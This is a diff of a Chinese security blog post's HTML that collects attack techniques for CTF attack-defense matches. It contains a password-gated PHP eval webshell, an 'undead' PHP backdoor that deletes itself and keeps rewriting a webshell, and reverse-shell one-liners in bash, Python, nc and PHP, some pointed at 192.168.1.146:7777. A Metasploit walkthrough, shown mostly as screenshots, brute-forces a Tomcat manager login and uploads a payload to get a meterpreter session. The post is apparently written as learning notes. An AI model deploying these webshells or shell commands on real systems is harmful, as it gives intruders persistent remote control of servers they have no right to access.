@@ -204,9 +204,19 @@
 <h2 id="md5-加密一句话木马"><a href="#md5-加密一句话木马" class="headerlink" title="md5 加密一句话木马"></a>md5 加密一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 密码: a='youjianing' &amp; b</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(md5($_POST[<span class="string">'a'</span>]) == <span class="string">'a4e8129c8cf66411c82c9a02fa08d223'</span>)&#123;</span><br><span class="line">    @<span class="keyword">eval</span>($_POST[<span class="string">'b'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>通过一层md5加密, 使得木马的安全性大大提高.<br>值得注意的是实战中需要找到足够安全的MD5密文.<br>顺便在这几次试验中确认, index是否被<code>&#39; &#39; 或 &quot; &quot;</code>包裹无影响. (没有系统学过PHP伤不起, 一到这种细节的地方就容易犯嘀咕) </p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>本来是想好好整理出自己的文章的, 但是<a href="https://www.jianshu.com/p/6aca9b29514d" target="_blank" rel="noopener">这篇博客</a>我觉得已经把基本的方法罗列的很清楚, 写的足够好了. </p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="出处"><a href="#出处" class="headerlink" title="出处"></a>出处</h3><p>本来是想好好整理出自己的文章的, 但是<a href="https://www.jianshu.com/p/6aca9b29514d" target="_blank" rel="noopener">这篇博客</a>我觉得已经把基本的方法罗列的很清楚, 写的足够好了. </p>
+<h3 id="linux命令反弹shell"><a href="#linux命令反弹shell" class="headerlink" title="linux命令反弹shell"></a>linux命令反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&apos;ip&apos;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&apos;/bin/bash&apos;,&apos;-i&apos;]);&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.1.146 7777</span><br></pre></td></tr></table></figure>
+
+<h3 id="php反弹shell"><a href="#php反弹shell" class="headerlink" title="php反弹shell"></a>php反弹shell</h3><h4 id="php的exec函数反弹"><a href="#php的exec函数反弹" class="headerlink" title="php的exec函数反弹"></a>php的<code>exec函数</code>反弹</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.146/7777&quot;);&apos;</span><br></pre></td></tr></table></figure>
+
+<h4 id="php的fsockopen远程连接"><a href="#php的fsockopen远程连接" class="headerlink" title="php的fsockopen远程连接"></a>php的<code>fsockopen</code>远程连接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
+
 <h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><h3 id="制作不死马"><a href="#制作不死马" class="headerlink" title="制作不死马"></a>制作不死马</h3><p>在awd中, 经过混淆的一句话木马虽然能提供可使用的shell, 但是容易被服务器管理者发现并删除, 这不利于权限的维持.<br>不死马(也叫内存马), 一旦在目标主机中运行就无法通过一般的方法删除, 这对我们持续持有权限是极有帮助的.</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 摘自 https://www.jianshu.com/p/3cd8cc491b54, 有改动</span></span><br><span class="line"><span class="comment"># ?pass=pass&amp;</span></span><br><span class="line"><span class="comment"># 密码 ?pass=pass &amp; a</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">$file = <span class="string">'2.php'</span>;</span><br><span class="line">$code = <span class="string">"&lt;?php if(md5($_GET['pass']) == '1a1dc91c907325c69271ddf0c944bc72')&#123;@eval($_POST['a']);&#125;?&gt;"</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents(\$file,\$code);</span><br><span class="line">    usleep(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 摘自 https://www.jianshu.com/p/3cd8cc491b54, 有改动</span></span><br><span class="line"><span class="comment"># ?pass=pass&amp;</span></span><br><span class="line"><span class="comment"># 密码 ?pass=pass &amp; a</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">$file = <span class="string">'2.php'</span>;</span><br><span class="line">$code = <span class="string">"&lt;?php if(md5($_GET['pass']) == '1a1dc91c907325c69271ddf0c944bc72')&#123;@eval($_POST['a']);&#125;?&gt;"</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents($file,$code);</span><br><span class="line">    usleep(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><code>ignore_user_abort($setting)</code>:<br>  函数设置与客户机断开是否会终止脚本的执行.<br>  setting: 可选。如果设置为 true，则忽略与用户的断开，如果设置为 false，(与用户的断开)会导致脚本停止运行。如果未设置该参数，会返回当前的设置。</li>
@@ -220,7 +230,93 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/php ./不死马.php</span><br></pre></td></tr></table></figure>
 
 <p>来运行, 这一点还不知道为什么.<br>希望dalao们能指点迷津.</p>
-<h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><p>DNS劫持, 中间人攻击, 杀不死马, 上述不死马异常的解决方法.<br>接触网络安全越久, 发现自己的未知面就越广.<br>觉得自己要学的东西还有太多.<br>不过我不想急于求成, 惟愿每天都有所收获. </p>
+<h2 id="metasploit一次实战"><a href="#metasploit一次实战" class="headerlink" title="metasploit一次实战"></a>metasploit一次实战</h2><ol start="0">
+<li><p>为什么要记录这次?<br>因为这次是我第一次比较正式的使用<code>metasploit</code>, 也真正的见识到了它的强大, 我相信这个工具将来还会扮演更重要的角色.<br>除此之外, 这个靶机位于国外, 需要科学上网, 所以如果将来想要复现还比较麻烦, 不如干脆详细的记录一下. 供将来的自己参照查看.</p>
+</li>
+<li><p>首先查看自己的ip和子网ip, 这是所有步骤的开始.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://pub54dbxm.bkt.clouddn.com/ifconfig.png" title="" data-fancybox="images"><img src="http://pub54dbxm.bkt.clouddn.com/ifconfig.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>获取了子网的ip地址后, 我们知道靶机就在这个子网中, 所以可以用Nmap扫出靶机的位置.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://pub54dbxm.bkt.clouddn.com/nmapsubnet.png" title="" data-fancybox="images"><img src="http://pub54dbxm.bkt.clouddn.com/nmapsubnet.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>靶机IP为<code>192.68.149.3</code></p>
+</li>
+<li><p>这个时候如果直接用浏览器访问是访问不到的. 因为我们还不知道它的http端口是多少(默认大多为80或8080). 我们还需要更详细的信息.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://pub54dbxm.bkt.clouddn.com/nmapA.png" title="" data-fancybox="images"><img src="http://pub54dbxm.bkt.clouddn.com/nmapA.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>再次访问<code>192.68.149.3:8080</code>就能访问web服务了. 下面就用这次的主角<code>metasploit</code>针对<code>tomcat</code>的漏洞进行攻击.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://pub54dbxm.bkt.clouddn.com/search.png" title="" data-fancybox="images"><img src="http://pub54dbxm.bkt.clouddn.com/search.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>我们选用tomcat_mgr_login这个漏洞来尝试获得后台的账户和密码.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://pub54dbxm.bkt.clouddn.com/use1.png" title="" data-fancybox="images"><img src="http://pub54dbxm.bkt.clouddn.com/use1.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>查看相关的参数</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://pub54dbxm.bkt.clouddn.com/options1.png" title="" data-fancybox="images"><img src="http://pub54dbxm.bkt.clouddn.com/options1.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>设置参数. 包括靶机的ip和端口, 使用的账户名和密码字典.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://pub54dbxm.bkt.clouddn.com/set1.png" title="" data-fancybox="images"><img src="http://pub54dbxm.bkt.clouddn.com/set1.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>设置完成后就可以开始漏洞利用了.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://pub54dbxm.bkt.clouddn.com/exploit11.png" title="" data-fancybox="images"><img src="http://pub54dbxm.bkt.clouddn.com/exploit11.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>成功爆破出了我们要的东西.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://pub54dbxm.bkt.clouddn.com/exploit12.png" title="" data-fancybox="images"><img src="http://pub54dbxm.bkt.clouddn.com/exploit12.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>用浏览器尝试下能不能登陆后台.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://pub54dbxm.bkt.clouddn.com/webbrowser1.png" title="" data-fancybox="images"><img src="http://pub54dbxm.bkt.clouddn.com/webbrowser1.png" alt title class></a>
+                <p></p>
+            </figure>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://pub54dbxm.bkt.clouddn.com/webbrowser2.png" title="" data-fancybox="images"><img src="http://pub54dbxm.bkt.clouddn.com/webbrowser2.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>没有问题!</p>
+</li>
+<li><p>下面再用第二个漏洞来获取shell.<br>这次我们用tomcat_mgr_upload, 并查看参数.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://pub54dbxm.bkt.clouddn.com/useandset.png" title="" data-fancybox="images"><img src="http://pub54dbxm.bkt.clouddn.com/useandset.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>设置好后就开始漏洞利用.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://pub54dbxm.bkt.clouddn.com/exploit2.png" title="" data-fancybox="images"><img src="http://pub54dbxm.bkt.clouddn.com/exploit2.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>下面是成功后的效果.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://pub54dbxm.bkt.clouddn.com/meterpreter.png" title="" data-fancybox="images"><img src="http://pub54dbxm.bkt.clouddn.com/meterpreter.png" alt title class></a>
+                <p></p>
+            </figure>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://pub54dbxm.bkt.clouddn.com/operatarget.png" title="" data-fancybox="images"><img src="http://pub54dbxm.bkt.clouddn.com/operatarget.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>可以看到这里的<code>meterpreter</code>和真正的shell还是有所区别的.<br>值得注意的一点, 可以用下面的命令来使用python调出shell.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/sh&apos;)&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>完.<br>头一次截了这么多图, 真鸡儿累.</p>
+</li>
+</ol>
+<h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><p>DNS劫持, 中间人攻击, 杀不死马, 上述不死马异常的解决方法.<br>接触网络安全越久, 发现自己的未知面就越广.<br>觉得自己要学的东西还有太多.<br><strong>不过我不想急于求成, 惟愿每天都有所收获.</strong></p>
 
         </div>
         
@@ -228,7 +324,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-07-29T15:39:36.355Z" itemprop="dateUpdated">2019-07-29 23:39:36</time>
+    最后更新时间：<time datetime="2019-07-30T07:26:51.423Z" itemprop="dateUpdated">2019-07-30 15:26:51</time>
 </span><br>
 
 
@@ -336,7 +432,7 @@
         <aside class="post-widget">
             <nav class="post-toc-wrap" id="post-toc">
                 <strong>目录</strong>
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#实战中可能会用到的几个技巧"><span class="post-toc-number">1.</span> <span class="post-toc-text">实战中可能会用到的几个技巧</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#md5-加密一句话木马"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">md5 加密一句话木马</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#反弹shell"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">反弹shell</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#不死马"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">不死马</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#制作不死马"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">制作不死马</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#TODO"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">TODO</span></a></li></ol></li></ol>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#实战中可能会用到的几个技巧"><span class="post-toc-number">1.</span> <span class="post-toc-text">实战中可能会用到的几个技巧</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#md5-加密一句话木马"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">md5 加密一句话木马</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#反弹shell"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">反弹shell</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#出处"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">出处</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#linux命令反弹shell"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">linux命令反弹shell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#python反弹shell"><span class="post-toc-number">1.2.3.</span> <span class="post-toc-text">python反弹shell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#nc反弹shell"><span class="post-toc-number">1.2.4.</span> <span class="post-toc-text">nc反弹shell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#php反弹shell"><span class="post-toc-number">1.2.5.</span> <span class="post-toc-text">php反弹shell</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#php的exec函数反弹"><span class="post-toc-number">1.2.5.1.</span> <span class="post-toc-text">php的exec函数反弹</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#php的fsockopen远程连接"><span class="post-toc-number">1.2.5.2.</span> <span class="post-toc-text">php的fsockopen远程连接</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#不死马"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">不死马</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#制作不死马"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">制作不死马</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#metasploit一次实战"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">metasploit一次实战</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#TODO"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">TODO</span></a></li></ol></li></ol>
             </nav>
             <div class="toc-bar"><div>
         </aside>
